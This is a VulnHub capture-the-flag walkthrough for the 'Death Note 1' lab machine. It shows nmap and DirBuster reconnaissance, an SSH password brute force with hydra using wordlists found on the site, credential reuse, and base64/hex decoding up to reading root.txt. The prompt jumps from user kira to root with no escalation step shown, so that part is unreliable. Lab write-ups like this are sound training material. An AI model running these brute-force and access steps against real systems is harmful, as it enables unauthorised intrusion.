---
title: Death Note 1 — Complete VulnHub Walkthrough
date: 2026-02-21T00:00:00.000Z
description: >-
  Walkthrough of the Death Note 1 VulnHub machine: reconnaissance, SSH
  brute-force with Hydra, hex/base64 decoding, and capturing root.txt.
category: ctf
os:
  - linux
difficulty: easy
mitre_tactic: TA0001
mitre_technique: T1190
tags:
  - ctf
  - vulnhub
  - linux
  - brute-force
  - hydra
  - nmap
  - ssh
  - web-enumeration
status: published
lang: en
readingTime: 5
lang_original: pt
translated: true
translated_at: '2026-03-04'
---

## 1. Introduction

The **Death Note 1** machine is available on [VulnHub](https://www.vulnhub.com/entry/deathnote-1,739/) and is classified as **Easy**. The goal is to compromise the server, escalating from web access to reading the `root.txt` file. The theme is inspired by the anime *Death Note*, with users such as **kira**, **L**, and **Misa** distributed throughout the machine.

The environment used in this walkthrough is a local network with the target machine at `192.168.3.152` and the attacking machine running **Kali Linux**.

---

## 2. Reconnaissance

### 2.1 Host Discovery

We use `netdiscover` to map the active hosts on the `/16` network and identify the IP of the target machine.

```bash
netdiscover -r 192.168.0.0/16
```

```text
Currently scanning: 192.168.0.0/16 | Screen View: Unique Hosts
4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240

IP             At MAC Address      Count  Len  MAC Vendor / Hostname
192.168.0.1    d8:07:b6:96:bf:c8   1      60   TP-LINK TECHNOLOGIES CO.,LTD.
192.168.3.1    88:36:cf:5d:f9:e5   1      60   Huawei Device Co., Ltd.
192.168.3.126  dc:21:5c:76:38:2e   1      60   Intel Corporate
192.168.3.152  08:00:27:72:d0:cd   1      60   PCS Systemtechnik GmbH   ← TARGET
```

### 2.2 Port and Service Scan

```bash
nmap -sS -A 192.168.3.152
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn&#x27;t have a title (text/html)
```

**Two open ports** were identified:

- **22/TCP** — SSH (OpenSSH 7.9p1)
- **80/TCP** — HTTP (Apache 2.4.38)

---

## 3. Web Enumeration

### 3.1 Initial Access

Accessing `http://192.168.3.152` through the browser, we found a completely unconfigured website. Navigating to the `/wordpress/` directory, we found a WordPress blog with the user **kira** and the post *&quot;i will eliminate you L!&quot;*, containing the phrase:

&gt; *&quot;my fav line is iamjustic3&quot;*

This serves as an important tip for the exploration phase.

### 3.2 Directory Enumeration with DirBuster

```bash
# Using OWASP DirBuster 1.0-RC1 against http://192.168.3.152:80/
# DirBuster default wordlist, 200 threads
```

```text
Relevant directories/files found (HTTP 200):
/wp-content/uploads/2021/07/
/wp-content/uploads/2021/07/user.txt   (359 bytes)
/wp-content/uploads/2021/07/notes.txt  (745 bytes)
/license.txt
/robots.txt
/manual/
```

Two `.txt` files were found in the WordPress uploads directory:

- **`user.txt`** — list of possible usernames
- **`notes.txt`** — list of possible passwords

### 3.3 Analysis of robots.txt

```bash
curl http://192.168.3.152/robots.txt
```

```text
fuck it my dad
added hint on /important.jpg

ryuk please delete it
```

The `robots.txt` reveals the existence of the `/important.jpg` file.

### 3.4 Reading important.jpg via curl

The `important.jpg` file was corrupted as an image. Using `curl`, it was possible to read its text content:

```bash
curl http://192.168.3.152/important.jpg
```

```text
i am Soichiro Yagami, light&#x27;s father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don&#x27;t know the password.
find it by yourself
but i think it is in the hint section of site
```

Confirmation: **`user.txt`** is the user wordlist and the password is in **`notes.txt`**.

---

## 4. Exploitation

### 4.1 SSH Brute Force with Hydra

With the wordlists `user.txt` and `notes.txt` in hand, we perform a brute force attack on the SSH service:

```bash
hydra -L user.txt -P notes.txt 192.168.3.152 ssh
```

```text
[DATA] max 16 tasks per 1 server, overall 16 tasks, 731 login tries (l:17/p:43)
[DATA] attacking ssh://192.168.3.152:22/
[STATUS] 293.00 tries/min, 293 tries in 00:01h
[22][ssh] host: 192.168.3.152   login: l   password: deathnote
```

&gt; ✅ **Credentials found: `l` / `deathnote`**

---

## 5. Initial Access

### 5.1 SSH login as user `l`

```bash
ssh l@192.168.3.152
```

```text
l@192.168.3.152&#x27;s password: deathnote

Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64

l@deathnote:~$
```

Successfully gained access to the target machine&#x27;s shell.

---

## 6. Post-Exploitation / Escalation

### 6.1 Discovery of the /opt/L Directory

```bash
l@deathnote:~$ cd /opt
l@deathnote:/opt$ ls -l
```

```text
drwxr-xr-x 4 root root 4096 Aug 29 2021 L
```

```bash
l@deathnote:/opt$ cd L &amp;&amp; ls -l
```

```text
drwxr-xr-x 2 root root 4096 Aug 29 2021 fake-notebook-rule
drwxr-xr-x 2 root root 4096 Aug 29 2021 kira-case
```

### 6.2 Reading case-file.txt

```bash
l@deathnote:/opt/L$ cd kira-case &amp;&amp; cat case-file.txt
```

```text
the FBI agent died on December 27, 2006

1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami&#x27;s family.

hmmmmmmmmmm......
and according to Watari,
he died as others died after Kira targeted them.

and we also found something in the fake-notebook-rule folder.
```

### 6.3 Hex + Base64 decoding of case.wav

Inside the `fake-notebook-rule` directory, we found a file `case.wav` that was unreadable as audio:

```bash
l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
```

```text
63 47 46 7a 63 33 64 6b 49 44 4f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

```bash
l@deathnote:/opt/L/fake-notebook-rule$ cat hint
```

```text
use cyberchef
```

Using **CyberChef** with the recipe `From Hex → From Base64`:

```text
Input (Hex):
63 47 46 7a 63 33 64 6b 49 44 4f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d

Step 1 — From Hex:
cGFzc3dkIDoga2lyYWlzZXZpbCA=

Step 2 — From Base64:
passwd : kiraisevil
```

&gt; ✅ **New credential found: `kira` / `kiraisevil`**

### 6.4 Log in as kira and decode kira.txt

```bash
# Elevating to user kira (or reconnecting via SSH)
ssh kira@192.168.3.152
# password: kiraisevil

root@deathnote:/home/kira# cat kira.txt
```

```text
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```

Decoding again via **CyberChef** (`From Base64`):

```text
please protect one of the following
1. L (/opt)
2. Misa (/var)
```

### 6.5 Discovering the Misa file in /var

```bash
root@deathnote:/var# cat misa
```

```text
it is toooo late for misa
```

---

## 7. Flags / Root

### 7.1 Capturing root.txt

Navigating to the root home directory, we locate the `root.txt` file:

```bash
root@deathnote:/var# cd
root@deathnote:~# ls
root.txt

root@deathnote:~# cat root.txt
```

```text
[REDACTED]

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```

&gt; 🏁 **CTF successfully completed!** The final flag was obtained from the `root.txt` file in the home directory of the `root` user.

---

## 8. Conclusion

The **Death Note 1** machine is a great exercise for CTF beginners, following a classic path of compromise:

| Step | Technique | Tool |
|---|---|---|
| Host discovery | Passive ARP scan | `netdiscover` |
| Surface mapping | Port/service scan | `nmap` |
| Web enumeration | Directory brute-force | `DirBuster` |
| Wordlist collection | Reading exposed files | `curl` |
| Initial access | SSH brute-force | `hydra` |
| Post-exploitation | Hex + Base64 decoding | `CyberChef` |
| Lateral escalation | Credential reuse | `ssh` |
| Flag capture | Root file reading | `cat` |

**Key takeaways:**

- Files that appear to be &quot;corrupted&quot; may contain useful data—always use `curl` or `cat` before discarding them.
- Wordlists exposed in web directories are a critical attack vector.
- Multi-layered encoded data (Hex → Base64) is common in easy-level CTFs; tools like CyberChef dramatically speed up analysis.
- Methodical directory enumeration (`/opt`, `/var`) after initial access is essential for finding escalation paths.

---

*Written by **G4ij1ntoor** — [KBM Security](https://kbmsecurity.com) · r3d/ops blog*
